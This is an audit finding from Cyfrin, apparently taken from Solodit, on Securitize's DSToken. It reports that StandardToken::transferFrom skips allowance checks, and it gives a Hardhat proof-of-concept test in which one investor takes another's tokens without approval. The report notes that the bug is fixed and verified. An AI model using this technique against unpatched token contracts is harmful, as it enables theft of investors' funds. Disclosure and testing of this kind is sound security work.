---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2025-10-10-cyfrin-securitize-dstoken-rebasing-v2-1-0-0
ingested_at: '2026-08-30T10:05:51Z'
protocol_category: []
published_at: '2025-10-10T00:00:00Z'
related_swc: []
severity: Critical
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-10-cyfrin-securitize-dstoken-rebasing-v2.1.md
tags:
- firm:cyfrin
- report:2025-10-10-cyfrin-securitize-dstoken-rebasing-v2-1
title: Investors can steal tokens from other investors since `StandardToken::transferFrom`
  never checks spending approvals
vuln_class: []
---

# Investors can steal tokens from other investors since `StandardToken::transferFrom` never checks spending approvals

_Section severity (from Solodit section header): Critical_  
_Audit firm: Cyfrin_  
_Source report: [2025-10-10-cyfrin-securitize-dstoken-rebasing-v2.1.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-10-cyfrin-securitize-dstoken-rebasing-v2.1.md)_

---

**Description:** Investors can steal tokens from other investors since `StandardToken::transferFrom` never checks spending approvals.

**Proof of Concept:** Add PoC to `test/dstoken-regulated.test.ts`:
```javascript
  describe('TransferFrom', function () {
    it('Investors can steal tokens from other investors', async function () {
      // setup 2 investors
      const [investor, investor2] = await hre.ethers.getSigners();
      const { dsToken, registryService, rebasingProvider } = await loadFixture(deployDSTokenRegulated);
      await registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_1, investor, registryService);
      await registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_2, investor2, registryService);

      // give first investor some tokens
      await dsToken.issueTokens(investor, 500);

      const valueToTransfer = 100;
      const shares = await rebasingProvider.convertTokensToShares(valueToTransfer);
      const multiplier = await rebasingProvider.multiplier();

      // connect as second investor
      const dsTokenFromInvestor = await dsToken.connect(investor2);

      // use `transferFrom` to steal tokens from first investor, even though
      // first investor never approved second investor as a spender
      await expect(dsTokenFromInvestor.transferFrom(investor, investor2, valueToTransfer))
        .to.emit(dsToken, 'TxShares')
        .withArgs(investor.address, investor2.address, shares, multiplier);
    });
  });
```

Run with: `npx hardhat test --grep "Investors can steal tokens from other investors"`.

**Recommended Mitigation:** `StandardToken::transferFrom` must enforce spending approvals.

**Securitize:** Fixed in commit [aefb895](https://github.com/securitize-io/dstoken/commit/aefb895e520d93ef0a8278ce3a7e88b2808478f5).

**Cyfrin:** Verified.

\clearpage
